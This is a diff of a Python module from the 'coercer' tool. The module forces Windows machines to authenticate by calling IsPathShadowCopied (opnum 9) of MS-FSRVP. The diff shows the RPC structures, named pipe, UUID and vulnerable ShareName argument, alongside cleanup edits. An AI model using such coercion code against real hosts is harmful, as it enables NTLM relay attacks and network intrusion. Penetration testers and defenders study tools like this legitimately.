@@ -5,15 +5,12 @@
 # Date created       : 15 Sep 2022
 
 from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
-from coercer.network.DCERPCSessionError import DCERPCSessionError
-from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
+from impacket.dcerpc.v5.ndr import NDRCALL
+from impacket.dcerpc.v5.dtypes import WSTR
 
 
 class _IsPathShadowCopied(NDRCALL):
-    """
-    Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol
-    """
+    """Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol"""
     opnum = 9
     structure = (
         ('ShareName', WSTR),  # Type: LPWSTR
@@ -22,14 +19,16 @@ class _IsPathShadowCopied(NDRCALL):
 
 class _IsPathShadowCopiedResponse(NDRCALL):
     """
-    Structure to parse the response of the RPC call to IsPathShadowCopied() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
+    Structure to parse the response of the RPC call to IsPathShadowCopied() in
+    [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
     """
     structure = ()
 
 
 class IsPathShadowCopied(MSPROTOCOLRPCCALL):
     """
-    Coercing a machine to authenticate using function IsPathShadowCopied (opnum 9) of [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
+    Coercing a machine to authenticate using function IsPathShadowCopied (opnum 9) of
+    [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
 
     Method found by:
      - [@topotam77](https://twitter.com/topotam77)
@@ -38,7 +37,7 @@ class IsPathShadowCopied(MSPROTOCOLRPCCALL):
     access = {
         "ncan_np": [
             {
-                "namedpipe": r"\PIPE\Fssagentrpc",
+                "namedpipe": r"\PIPE\FssagentRpc",
                 "uuid": "a8e0653c-2744-4389-a61d-7373df8b2292",
                 "version": "1.0"
             }
@@ -56,7 +55,7 @@ class IsPathShadowCopied(MSPROTOCOLRPCCALL):
         "vulnerable_arguments": ["ShareName"]
     }
 
-    def trigger(self, dcerpc_session, target):
+    def trigger(self, dcerpc_session):
         if dcerpc_session is not None:
             try:
                 request = _IsPathShadowCopied()
